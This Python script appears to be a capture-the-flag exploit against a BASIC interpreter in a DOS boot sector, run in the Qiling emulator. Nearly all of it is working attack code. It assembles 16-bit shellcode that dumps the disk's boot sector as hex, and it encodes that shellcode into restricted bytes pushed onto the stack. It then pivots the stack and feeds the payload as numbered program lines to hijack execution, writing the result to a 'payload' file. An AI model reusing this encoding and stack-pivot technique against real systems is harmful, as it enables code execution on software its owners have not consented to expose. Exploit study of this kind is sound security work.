from os import fdopen
from qiling import Qiling
from qiling.extensions import pipe
from qiling.os.disk import QlDisk
from qiling.const import *
import sys
import struct
import unicorn, tempfile, subprocess
from lookup import lookup

should_print = False
input_c = 0

disk = 0x82 #flag 0x80 for bootlaoder

def encode(byte):
    if byte not in lookup:
        return f"""
        push 0x42{byte:02x}
        pop ax
        push ax
        inc sp
        inc sp
        inc sp
        """
    a,b,c = lookup[byte]
    return f"""
        push 0x42{a:02x}
        pop ax
        .byte 0x2c, {hex(b)}
        .byte 0x2c, {hex(c)}
        push ax
        inc sp
        inc sp
        inc sp
        """

def compile(asm, vma):
    fd, path = tempfile.mkstemp(suffix =".S")
    fd1, path1 = tempfile.mkstemp()
    with fdopen(fd, "w") as f:
        f.write(asm)

    cmd = f'clang {path} -nostdlib -target i386-none-elf -static -Ttext {hex(vma)} -o {path} && objcopy --only-section=.text --output-target binary {path} {path1}'

    subprocess.check_output(["sh", "-c", cmd])
    with fdopen(fd1, "rb") as f:
        data = f.read()
    return data

asm = f'''
.intel_syntax noprefix
.code16
.section .text
.global _start
_start:
    //read bootloader
    mov ax, 0x0201
    mov bx, 0x600
    mov dl, {hex(disk)}
    mov cx, 0x0001
    mov dh, 0
    int 0x13

    mov si, 0x600
    mov ah, 0x0e

    mov cx, 0x300 //pwntools needs more /shrug
lp:
    push si
    lodsb
    AAM 16
    push ax
    shr ax, 8
    lea si, hex
    add si, ax
    lodsb
    mov ah, 0x0e
    int 0x10

    pop ax
    xor ah, ah
    lea si, hex
    add si, ax
    lodsb
    mov ah, 0x0e
    int 0x10
    pop si
    inc si
    loop lp

    xor ax, ax
    int 0x16
shutdown:
    mov ax, 0x5307
    mov bx, 0x01
    mov cx, 0x03
    int 0x15
loop:
    hlt
    jmp loop
hex:
.ascii "0123456789ABCDEF"

'''
data = compile(asm, 0x4141)

asm = '''
.intel_syntax noprefix
.code16
.section .text
.global _start
_start:
    push 0x4141
    pop sp
    inc sp
    inc sp
'''+"".join(encode(byte) for byte in data)+encode(0xc4)+encode(0x84)+f"""
    dec sp
    dec sp
    dec sp  
    dec sp
    pop sp
    inc sp
    inc sp
"""+encode(0x66)+encode(0xff)+encode(0xe0)+"""
    push 0x4141
    pop ax
"""
data = b"AAAA"+compile(asm, 0x8018)
data = data+b'B'*(0x14-(len(data)%0x14))

input_text = b"65508~~\r"

n = len(data)//0x14
chunks = [data[i*0x14:][:0x14] for i in range(n)]
for i,c in enumerate(chunks):
    input_text += f"{i+1}".encode()+c+b"\r"

with open("payload", "wb") as f:
    f.write(input_text)

input_text += b"list\r"

ql = Qiling(["./rootfs/basic.DOS_MBR"], "./rootfs",
            verbose=QL_VERBOSE.DISASM,
            console=True)
ql.add_fs_mapper(0x80, QlDisk("./rootfs/basic.DOS_MBR", 0x80))

def output(ql):
    print(chr(ql.reg.al), end="")
    pass

def get_input(ql):
    global input_c
    global input_text
    if input_c >= len(input_text):
        print("NO More input :(")
        exit(0)
        return
    ret = input_text[input_c]
    input_c +=1
    ql.reg.al = ret

ql.set_api((0x16, 0x00), get_input, QL_INTERCEPT.CALL)
ql.set_api((0x10, 0x0e), output, QL_INTERCEPT.CALL)

ql.verbose = QL_VERBOSE.OFF
ql.run()